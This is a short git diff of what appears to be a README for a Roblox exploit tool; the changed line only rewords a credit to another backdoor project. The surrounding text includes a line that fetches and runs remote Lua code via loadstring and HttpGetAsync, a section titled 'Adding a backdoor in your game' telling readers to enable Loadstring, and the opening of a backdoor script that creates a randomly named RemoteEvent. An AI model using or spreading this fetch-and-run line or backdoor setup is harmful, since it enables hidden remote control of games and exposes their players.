@@ -43,7 +43,7 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-sc
 
 ## Adding a backdoor in your game
 Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
-Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for copying(me) this thingy.)
+Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for me copying this thingy(and modifying it).)
 ```lua
 local Remote = Instance.new("RemoteEvent")
 Remote.Name = tostring(math.random(1e10,1e10))
